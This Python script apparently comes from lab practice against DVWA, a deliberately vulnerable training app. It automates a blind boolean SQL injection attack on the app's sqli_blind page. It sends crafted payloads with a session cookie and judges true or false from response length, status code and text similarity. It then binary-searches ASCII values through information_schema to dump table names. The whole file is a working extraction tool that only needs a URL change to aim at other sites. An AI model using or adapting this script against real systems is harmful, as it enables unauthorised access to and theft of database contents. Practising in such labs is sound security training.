import requests
import difflib
import time

# ===== CONFIG =====
url = "http://172.10.10.134:4280/vulnerabilities/sqli_blind/"
cookies = {
    "security": "low",
    "PHPSESSID": "f8ebefeb528b7e57cc9108813cd6ab5a"
}
params_base = {"Submit": "Submit"}

# ===== REQUEST =====
def send(payload, retries=3):
    for _ in range(retries):
        try:
            r = requests.get(
                url,
                params={**params_base, "id": payload},
                cookies=cookies,
                timeout=5
            )
            return r
        except requests.exceptions.RequestException:
            time.sleep(0.5)
    return None


# ===== SIMILARITY =====
def similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


# ===== BASELINE =====
print("[*] Collecting baseline...")

true_res  = send("1' AND 1=1 #")
false_res = send("1' AND 1=2 #")

true_text  = true_res.text
false_text = false_res.text

true_len  = len(true_text)
false_len = len(false_text)
true_code = true_res.status_code

print(f"[+] TRUE length: {true_len}, FALSE length: {false_len}")


# ===== BOOLEAN DETECTOR =====
def is_true(payload):
    r = send(payload)
    if not r:
        return False

    text = r.text

    # length
    len_score = abs(len(text) - true_len) < abs(len(text) - false_len)

    # status code
    code_score = (r.status_code == true_code)

    # similarity
    sim_true  = similarity(text, true_text)
    sim_false = similarity(text, false_text)
    sim_score = sim_true > sim_false

    return (len_score + code_score + sim_score) >= 2


# ===== EXTRACT TABLE NAME =====
def get_table_char(table_index, pos):
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2

        payload = f"1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT {table_index},1),{pos},1))>{mid} -- -"

        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1

    if low < 32:
        return None

    return chr(low)


# ===== GET FULL TABLE NAME =====
def get_table_name(table_index, max_len=30):
    payload = f"1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT {table_index},1))>0 -- -"

    if not is_true(payload):
        return None

    name = ""

    for pos in range(1, max_len + 1):
        c = get_table_char(table_index, pos)

        # dừng khi gặp NULL
        if not c or c == " ":
            break

        name += c

    return name


# ===== DUMP TABLES =====
print("[*] Dumping tables...")

tables = []

for i in range(0, 10):  # thử tối đa 10 tables
    table_name = get_table_name(i)

    if not table_name:
        break

    print(f"[+] Table {i}: {table_name}")
    tables.append(table_name)

print("\n[✔] All tables:")
for t in tables:
    print("-", t)

print(is_true(
        "1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1))>50 -- -"))
print(is_true(
        "1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1))>120 -- -"))